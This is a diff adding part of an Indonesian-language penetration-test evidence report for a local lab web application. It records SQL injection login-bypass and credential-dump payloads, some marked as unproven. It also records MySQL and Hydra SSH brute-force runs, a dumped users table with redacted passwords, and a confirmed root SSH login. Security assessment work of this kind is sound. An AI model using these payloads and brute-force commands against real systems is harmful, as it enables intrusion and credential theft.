+![SQLi - penentuan jumlah kolom — 5.png](bukti-pentest/5.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -X POST .../login-noportal --data-urlencode "username=user_a' ORDER BY 7-- -" ...
+— TIDAK ADA OUTPUT TERCETAK —
+```
+
+</details>
+
+### [`6.png`](bukti-pentest/6.png) — SQLi - auth bypass
+
+**Jam 00:45 WIB.**
+
+![SQLi - auth bypass — 6.png](bukti-pentest/6.png)
+
+> **Belum terbukti.** Baris `Masuk sebagai: BlackHat` tidak tercetak; yang terbukti hanya redirect 302.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -c /tmp/s ... --data-urlencode "username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -"
+HTTP=302 -> http://192.168.1.18:3000/dashboard
+— Baris 'Masuk sebagai: BlackHat' TIDAK tercetak —
+```
+
+</details>
+
+### [`7.png`](bukti-pentest/7.png) — SQLi - dump kredensial
+
+**Jam 00:45 WIB.**
+
+![SQLi - dump kredensial — 7.png](bukti-pentest/7.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ P="x' UNION SELECT 1,'p','x','perusahaan',(SELECT GROUP_CONCAT(...) FROM users),1-- -"
+$ curl -s -c /tmp/d -o /dev/null -X POST .../login-noportal --data-urlencode username=$P ...
+— TIDAK ADA OUTPUT TERCETAK; hasil dump tidak terbukti —
+```
+
+</details>
+
+### [`8.png`](bukti-pentest/8.png) — Brute force MySQL port 3307
+
+**Jam 00:46 WIB.**
+
+![Brute force MySQL port 3307 — 8.png](bukti-pentest/8.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ for u in root labkeu_user labkeu admin; do for p in "" root REDACTED_WEAK_PASSWORD REDACTED_DB_PASSWORD REDACTED_STORED_PASSWORD REDACTED_DB_PASSWORD; ...
+TEMUKAN: labkeu_user / REDACTED_DB_PASSWORD
+```
+
+</details>
+
+### [`9.png`](bukti-pentest/9.png) — Dump penuh basis data
+
+**Jam 00:47 WIB.**
+
+![Dump penuh basis data — 9.png](bukti-pentest/9.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+| Tables_in_labkeu | data_keuangan, dokumen, perusahaan, users  (4 tabel)
+| 1  | user_a     | REDACTED_STORED_PASSWORD | perusahaan | Admin CV Sinar Abadi | 1        |
+| 2  | user_b     | REDACTED_STORED_PASSWORD | perusahaan | Admin PT Maju Bersama| 2        |
+| 3  | individu1  | REDACTED_STORED_PASSWORD | individu   | Budi Santoso        | NULL     |
+| 11 | test_individu_$(date %s) | REDACTED_TEST_PASSWORD | individu | Test Individu | NULL    |
+| 13 | zzz_unique_18950 | REDACTED_TEST_PASSWORD | individu | Test | NULL |
+| 14 | zzz_csrf_31965     | REDACTED_TEST_PASSWORD | individu | Test | NULL |
+| 20 | esc_audit          | REDACTED_TEST_PASSWORD | perusahaan| Audit | NULL |
+| data_keuangan: 4 baris, perusahaan_id 1 (2 baris) dan 2 (2 baris) |
+```
+
+</details>
+
+### [`10.png`](bukti-pentest/10.png) — Brute force SSH dengan Hydra
+
+**Jam 00:42 WIB.**
+
+![Brute force SSH dengan Hydra — 10.png](bukti-pentest/10.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
+$ printf 'Labkeu\nREDACTED_DB_PASSWORD\npassword\nREDACTED_STORED_PASSWORD\nREDACTED_STORED_PASSWORD\ntoor\n' > /tmp/p.txt
+$ hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
+Hydra v9.7 starting at 2026-09-29 00:42:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (1:4/p:6)
+[22][ssh] host: 192.168.1.18 login: root password: REDACTED_SSH_ROOT_PW
+[STATUS] attack finished for 192.168.1.18 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+finished at 2026-09-29 00:42:54
+```
+
+</details>
+
+### [`11.png`](bukti-pentest/11.png) — Akses root terkonfirmasi
+
+**Jam 00:47 WIB.**
+
+![Akses root terkonfirmasi — 11.png](bukti-pentest/11.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ sshpass -p 'REDACTED_SSH_ROOT_PW' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id; uname -a; cat /etc/alpine-release"
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
+Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux
+3.24.2
+```
+
+</details>
+
